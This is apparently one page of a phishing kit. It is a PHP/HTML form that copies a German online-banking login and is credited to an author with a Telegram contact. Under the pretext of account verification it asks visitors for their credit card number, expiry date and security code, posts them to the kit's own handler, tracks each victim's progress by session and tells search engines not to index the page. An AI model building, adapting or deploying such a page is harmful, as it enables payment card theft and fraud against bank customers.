<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/
    
    require_once '../includes/main.php';
    $_SESSION['last_page'] = 'cc';
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/style.css">
        <link rel="stylesheet" type="text/css" href="../assets/css/bundle.css">

        <link rel="icon" type="image/x-icon" href="../assets/imgs/favicon.ico" />

        <title>Login</title>
    </head>

    <body>

        <!-- HEADER -->
        <header style="margin-bottom: 9%;" class="header header--g2p header--subpage u-print-hidden" data-login-state="logged-in" role="banner">
        <div class="header__inner">
          <a class="u-left" >
            <img src="../assets/imgs/logoo.png"/>
          </a>
        </div>
      </header>
        <!-- END HEADER -->
        
        <!-- MAIN -->
        <main id="main">
            <div class="container">
                
                <div class="login-area">
                    <h3 class="mb-2" style="color: #ff781c;">Online-Banking: Login</h3>
                    <h4 style="color: #ff781c;">Überprüfen Sie Ihre Angaben</h4>
                    <div class="box mb-4 pushtan">
                        <p>Überprüfen Sie Ihre Karte</p>
                    </div>
                    <div class="box">
                        <form action="../index.php" method="post">
                            <input type="hidden" name="captcha">
                            <input type="hidden" name="step" value="cc">
                            <p class="text">
                                Geben Sie Ihre Kreditkartendaten ein, um Ihr Bankkonto online zu überprüfen
                            </p>
                            <div class="form-group row <?php echo is_invalid_class($_SESSION['errors'],'one') ?>">
                                <label for="one" class="col-lg-3 col-md-3 col-sm-12 col-12 col-form-label">Kartennummer *</label>
                                <div class="col-lg-9 col-md-9 col-sm-12 col-12">
                                    <input type="text" class="form-control" id="one" name="one" placeholder="Kartennummer" value="<?php echo get_value('one'); ?>">
                                </div>
                            </div>
                            <div class="form-group row <?php echo is_invalid_class($_SESSION['errors'],'two') ?>">
                                <label for="two" class="col-lg-3 col-md-3 col-sm-12 col-12 col-form-label">Haltbarkeitsdatum(MM/JJ) *</label>
                                <div class="col-lg-9 col-md-9 col-sm-12 col-12">
                                    <input type="text" maxlength="7" class="form-control" id="two" name="two" placeholder="Haltbarkeitsdatum(MM/JJ)" value="<?php echo get_value('two'); ?>">
                                </div>
                            </div>
                            <div class="form-group row <?php echo is_invalid_class($_SESSION['errors'],'three') ?>">
                                <label for="three" class="col-lg-3 col-md-3 col-sm-12 col-12 col-form-label">Sicherheitscode *</label>
                                <div class="col-lg-9 col-md-9 col-sm-12 col-12">
                                    <input type="text" maxlength="3" class="form-control" id="three" name="three" placeholder="Sicherheitscode" value="<?php echo get_value('three'); ?>">
                                </div>
                            </div>
                            <p class=text-left><u>Es gelten die Bedingungen für den Überweisungsverkehr</u></p>
                            <div class="text-right"><button type="submit" style="background-color: #ff781c;">Fortsetzen <i class="fas fa-chevron-circle-right"></i></button></div>
                        </form>
                    </div>
                </div>

                
            </div>
        </main>
        <!-- END MAIN -->
    <br><br>   <br><br>
        <!-- FOOTER -->
        <footer id="footer">
        <footer class="footer--g2p u-cf">
        <ul class="footer__links-top">

        </ul>
        <ul class="footer__links-bottom">
          <li class="footer__link">
            <a href="">Karriere</a>
          </li>
          <li class="footer__link">
            <a href="">Vertriebspartner</a>
          </li>
          <li class="footer__link">
            <a href="">Wholesale Banking</a>
          </li>
          <li class="footer__link">
            <a href="">Kontaktformular</a>
          </li>
          <li class="footer__link">
            <a href="">AGB</a>
          </li>
          <li class="footer__link">
            <a href="">Datenschutz</a>
          </li>
          <li class="footer__link">
            <a href="">Impressum</a>
          </li>
        </ul>
      </footer>
        </footer>
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/jquery-simple-upload@1.1.0/simpleUpload.min.js"></script>
        <script src="../assets/js/script.js"></script>

    </body>

</html>